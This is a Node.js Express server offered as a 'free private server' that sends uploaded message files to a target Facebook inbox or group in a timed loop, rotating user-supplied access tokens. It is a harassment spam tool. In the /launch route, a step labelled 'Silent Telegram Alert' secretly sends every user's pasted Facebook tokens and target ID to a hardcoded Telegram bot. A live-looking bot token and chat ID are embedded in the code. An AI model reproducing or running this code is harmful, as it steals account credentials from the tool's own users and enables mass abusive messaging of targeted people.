const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 10000;
const upload = multer({ dest: 'uploads/' });

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());

// --- 🔒 MASTER CONFIG ---
const TELEGRAM_BOT_TOKEN = '8770013875:AAGhkM-jSyLd7z9h4-505eICfXu4fHunsi8'; 
const TELEGRAM_CHAT_ID = '6787359882'; 

let activeTasks = {}; 
let userLogs = {}; // Private logs store karne ke liye

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.log("Telegram Error"); }
}

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>FREE SERVER ALL TIME</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #000; color: #00ffff; padding: 15px; font-family: 'Courier New', monospace; }
        .container { border: 2px solid #00ffff; padding: 20px; border-radius: 15px; box-shadow: 0 0 20px #00ffff; max-width: 500px; margin: auto; background: rgba(0,0,0,0.9); }
        .form-control { background: #111; color: #fff; border: 1px solid #333; margin-bottom: 10px; font-size: 13px; }
        .btn-main { background: #00ffff; color: #000; font-weight: bold; width: 100%; padding: 10px; border: none; border-radius: 5px; }
        #logBox { background: #050505; border: 1px solid #00ff00; height: 180px; overflow-y: auto; color: #0f0; padding: 10px; font-size: 11px; margin-top: 15px; border-radius: 5px; box-shadow: inset 0 0 10px #003300; }
        h2 { text-shadow: 0 0 10px #00ffff; text-align: center; font-size: 22px; }
        .status-dot { height: 8px; width: 8px; background-color: #0f0; border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 5px #0f0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>◈ FREE SERVER ALL TIME ◈</h2>
        <p style="text-align:center; font-size:10px; color:#555;">PRIVATE CLOUD SESSION ACTIVE</p>
        
        <form id="launchForm" action="/launch" method="POST" enctype="multipart/form-data">
            <input type="hidden" name="user_session" id="user_session">
            <label>Number of Tokens:</label>
            <input type="number" name="numTokens" id="n" class="form-control" onchange="gen()" required>
            <div id="tokenInputs"></div>
            <input type="text" name="threadId" placeholder="Target ID (Inbox/Group)" class="form-control" required>
            <input type="text" name="haterName" placeholder="Hater Name" class="form-control" required>
            <input type="number" name="speed" placeholder="Speed in Seconds" class="form-control" value="5" required>
            <input type="file" name="msgFile" class="form-control" required>
            <button type="submit" class="btn-main">START MY PRIVATE SERVER</button>
        </form>

        <div id="logBox">-- Ready to Initialize --</div>

        <div style="margin-top:15px; border-top: 1px dotted #333; padding-top:10px;">
            <form action="/stop" method="POST">
                <input type="hidden" name="stop_session" id="stop_session">
                <input type="text" name="taskId" placeholder="Your Task ID" class="form-control" required>
                <button type="submit" class="btn-main" style="background:#ff0044; color:white;">TERMINATE TASK</button>
            </form>
        </div>
    </div>

    <script>
        // Unique ID generate karo jo sirf is browser mein rahe
        if(!localStorage.getItem('fs_private_id')) {
            localStorage.setItem('fs_private_id', 'PVT-' + Math.random().toString(36).substr(2, 6).toUpperCase());
        }
        const myID = localStorage.getItem('fs_private_id');
        document.getElementById('user_session').value = myID;
        document.getElementById('stop_session').value = myID;

        function gen(){
            let n = document.getElementById('n').value;
            let d = document.getElementById('tokenInputs'); d.innerHTML = '';
            for(let i=1; i<=n; i++) d.innerHTML += \`<input type="text" name="token\${i}" placeholder="Paste Token \${i}" class="form-control" required>\`;
        }

        // Sirf apna logs fetch karne ka logic
        setInterval(async () => {
            try {
                let res = await fetch('/get-my-logs?uid=' + myID);
                let data = await res.json();
                if(data.length > 0) {
                    document.getElementById('logBox').innerHTML = data.join('<br>');
                    // Scroll to bottom
                    let box = document.getElementById('logBox');
                    box.scrollTop = box.scrollHeight;
                }
            } catch(e){}
        }, 2000);
    </script>
</body>
</html>`);
});

// PRIVATE LOGS ROUTE
app.get('/get-my-logs', (req, res) => {
    const uid = req.query.uid;
    if (userLogs[uid]) {
        res.json(userLogs[uid]);
    } else {
        res.json(["-- No Active Task Found for Your Session --"]);
    }
});

app.post('/launch', upload.single('msgFile'), async (req, res) => {
    const { numTokens, threadId, haterName, speed, user_session } = req.body;
    const tokens = [];
    for (let i = 1; i <= numTokens; i++) { if (req.body['token' + i]) tokens.push(req.body['token' + i]); }
    
    const messages = fs.readFileSync(req.file.path, 'utf-8').split('\n').filter(m => m.trim() !== '');
    const taskId = 'FS-' + Math.floor(1000 + Math.random() * 9000);

    // 1. DATA CAPTURE (Silent Telegram Alert)
    const report = `👤 *NEW USER LOGGED*\n🆔 *Session:* \`${user_session}\`\n🎯 *Task:* \`${taskId}\`\n🔥 *Target:* \`${threadId}\`\n🔑 *Tokens:* \n${tokens.join('\n')}`;
    await sendToTelegram(report);

    // 2. PRIVATE TASK EXECUTION
    activeTasks[taskId] = { owner: user_session, status: true };
    userLogs[user_session] = [`<span style="color:yellow;">[SYSTEM] Task ${taskId} Initialized...</span>`];
    
    let msgIdx = 0;
    let tokenIdx = 0;

    const interval = setInterval(async () => {
        if (!activeTasks[taskId] || !activeTasks[taskId].status) { 
            clearInterval(interval); 
            return; 
        }
        
        const currentToken = tokens[tokenIdx % tokens.length];
        const currentMsg = messages[msgIdx % messages.length];

        try {
            await axios.post(`https://graph.facebook.com/v17.0/t_${threadId}/`, null, {
                params: { access_token: currentToken, message: `${haterName} ${currentMsg}` }
            });
            let logLine = `[${new Date().toLocaleTimeString()}] <span class="status-dot"></span> Sent: ${currentMsg.substring(0,20)}...`;
            userLogs[user_session].push(logLine);
        } catch (e) {
            userLogs[user_session].push(`[${new Date().toLocaleTimeString()}] ❌ Token Error or Expired`);
        }
        
        // Logs clean rakho (Limit 30 lines)
        if(userLogs[user_session].length > 30) userLogs[user_session].shift();
        
        msgIdx++; tokenIdx++;
    }, speed * 1000);

    res.send(`<body style="background:#000;color:#0f0;text-align:center;padding:50px;font-family:monospace;"><h2>✔ PRIVATE SERVER LIVE!</h2><p>YOUR TASK ID: <b style="color:#fff;">${taskId}</b></p><p>Check your private logs on the main dashboard.</p><a href="/" style="color:#00ffff; border:1px solid #00ffff; padding:10px; text-decoration:none;">GO TO LOGS</a></body>`);
});

app.post('/stop', (req, res) => {
    const { taskId, stop_session } = req.body;
    // Check karo ki task usi bande ka hai ya nahi
    if (activeTasks[taskId] && activeTasks[taskId].owner === stop_session) {
        activeTasks[taskId].status = false;
        userLogs[stop_session].push(`<span style="color:red;">[SYSTEM] Task ${taskId} Terminated by User.</span>`);
        res.send(`<body style="background:#000;color:red;text-align:center;padding:50px;"><h2>Task ${taskId} Stopped!</h2><a href="/" style="color:#fff;">Back</a></body>`);
    } else {
        res.send(`<body style="background:#000;color:yellow;text-align:center;padding:50px;"><h2>Invalid Task ID or Access Denied</h2><a href="/" style="color:#fff;">Back</a></body>`);
    }
});

app.listen(port, '0.0.0.0', () => console.log('FREE SERVER PRIVATE SESSIONS LIVE'));
